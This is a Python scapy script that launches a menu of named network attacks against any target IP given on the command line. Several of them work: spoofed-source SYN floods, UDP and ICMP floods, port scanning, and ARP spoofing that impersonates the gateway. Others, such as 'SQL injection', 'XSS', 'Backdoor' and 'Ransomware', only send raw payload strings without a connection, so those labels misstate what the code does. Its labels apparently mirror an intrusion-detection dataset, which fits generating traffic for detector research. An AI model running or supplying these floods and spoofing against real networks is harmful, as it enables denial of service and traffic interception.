#!/usr/bin/env python3

import time
import random
import argparse
import sys
from datetime import datetime

from scapy.all import IP, TCP, UDP, ICMP, ARP, Ether, Raw, send, sendp, conf
conf.verb = 0

# ── Utils ─────────────────────────────────────────────

def ts():
    return datetime.now().strftime('%H:%M:%S')

def log(name, msg):
    print(f"[{ts()}] [{name}] {msg}")

# ── ATTACKS ───────────────────────────────────────────

def attack_ddos_tcp(target, count):
    for _ in range(count):
        pkt = IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                 dst=target) / TCP(dport=80, flags='S')
        send(pkt, verbose=False)

def attack_ddos_udp(target, count):
    for _ in range(count):
        pkt = IP(dst=target) / UDP(dport=random.randint(1,65535)) / Raw(load=b'X'*100)
        send(pkt, verbose=False)

def attack_ddos_icmp(target, count):
    for _ in range(count):
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=False)

def attack_port_scan(target, _):
    ports = [21,22,80,443,8080,3306]
    for p in ports:
        pkt = IP(dst=target) / TCP(dport=p, flags='S')
        send(pkt, verbose=False)

def attack_sql(target, count):
    payload = "' OR 1=1 --"
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=80,flags='PA')/Raw(load=payload.encode())
        send(pkt, verbose=False)

def attack_mitm(target, _):
    fake_mac = "02:00:00:aa:bb:cc"
    gateway = target.rsplit('.',1)[0] + ".1"
    for _ in range(10):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway, pdst=target, hwsrc=fake_mac)
        sendp(pkt, verbose=False)

def attack_password(target, count):
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=22,flags='S')
        send(pkt, verbose=False)

def attack_vuln(target, _):
    paths = ["/admin","/.env","/config.php"]
    for path in paths:
        pkt = IP(dst=target)/TCP(dport=80,flags='PA')/Raw(load=path.encode())
        send(pkt, verbose=False)

# ── NEW 6 ATTACKS ─────────────────────────────────────

def attack_xss(target, count):
    payload = "<script>alert(1)</script>"
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=80,flags='PA')/Raw(load=payload.encode())
        send(pkt, verbose=False)

def attack_upload(target, count):
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=80,flags='PA')/Raw(load=b"malicious.php")
        send(pkt, verbose=False)

def attack_backdoor(target, count):
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=4444,flags='PA')/Raw(load=b'cmd')
        send(pkt, verbose=False)

def attack_ransomware(target, count):
    for _ in range(count):
        pkt = IP(dst=target)/TCP(dport=445,flags='PA')/Raw(load=bytes(random.getrandbits(8) for _ in range(100)))
        send(pkt, verbose=False)

def attack_fingerprint(target, _):
    for ttl in range(1,20):
        pkt = IP(dst=target, ttl=ttl)/ICMP()
        send(pkt, verbose=False)

def attack_botnet(target, count):
    for _ in range(count):
        pkt = IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                 dst=target)/TCP(dport=80,flags='S')
        send(pkt, verbose=False)

# ── REGISTRY ──────────────────────────────────────────

ATTACKS = {
    "DDoS_TCP": attack_ddos_tcp,
    "DDoS_UDP": attack_ddos_udp,
    "DDoS_ICMP": attack_ddos_icmp,
    "Port_Scanning": attack_port_scan,
    "SQL_injection": attack_sql,
    "MITM": attack_mitm,
    "Password": attack_password,
    "Vulnerability_scanner": attack_vuln,
    "XSS": attack_xss,
    "Upload_attack": attack_upload,
    "Backdoor": attack_backdoor,
    "Ransomware": attack_ransomware,
    "Fingerprinting": attack_fingerprint,
    "Botnet": attack_botnet
}

# ── MAIN ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--attack", required=True, choices=list(ATTACKS.keys()) + ["all"])
    parser.add_argument("--count", type=int, default=100)
    args = parser.parse_args()

    if args.attack == "all":
        for name, fn in ATTACKS.items():
            log(name, "Starting")
            fn(args.target, args.count)
            time.sleep(3)
    else:
        log(args.attack, "Starting")
        ATTACKS[args.attack](args.target, args.count)

    print("Done.")

if __name__ == "__main__":
    main()